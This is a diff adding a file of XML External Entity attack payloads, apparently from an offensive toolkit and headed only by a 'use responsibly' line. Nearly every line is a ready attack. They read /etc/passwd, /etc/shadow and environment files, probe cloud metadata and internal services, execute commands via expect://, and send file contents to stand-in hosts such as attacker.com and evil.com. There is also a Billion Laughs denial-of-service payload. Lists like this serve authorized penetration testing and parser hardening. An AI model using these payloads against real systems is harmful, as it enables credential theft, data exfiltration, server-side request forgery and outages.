@@ -1,0 +1,60 @@
+# 0xHunter XXE (XML External Entity) Payloads
+# Use responsibly and only on authorized targets
+
+# Basic XXE - Linux file read
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+
+# Basic XXE - Windows file read
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>
+
+# XXE via /etc/hosts
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>
+
+# XXE via /proc/self/environ
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>
+
+# Blind XXE - SSRF via HTTP
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><root>&xxe;</root>
+
+# XXE via Parameter Entity
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo/>
+
+# XXE OOB (Out-Of-Band) Exfiltration
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]><foo/>
+
+# XXE via CDATA
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root><![CDATA[&xxe;]]></root>
+
+# XXE in SVG
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<text font-size="15" x="0" y="16">&xxe;</text></svg>
+
+# XXE via SOAP
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;%all;]><doc>&send;</doc>]]></foo></soap:Body>
+
+# XXE via Excel/XLSX (xl/workbook.xml)
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+# Recursive entity (Billion Laughs DoS)
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://localhost/">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><root/>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://evil.com/?x=%data;'>">%param1;]><root>&exfil;</root>
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
+<?xml version="1.0"?><!DOCTYPE a [<!ENTITY b SYSTEM "file:///etc/passwd">]><a>&b;</a>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://localhost:6379/info">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://localhost:9200/_cat/indices">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a SYSTEM "file:///etc/passwd"><!ENTITY % b "<!ENTITY c SYSTEM 'http://evil.com/?%a;'>">%b;]><foo>&c;</foo>
+<![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>]]>
+<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/evil.dtd"><foo>&xxe;</foo>
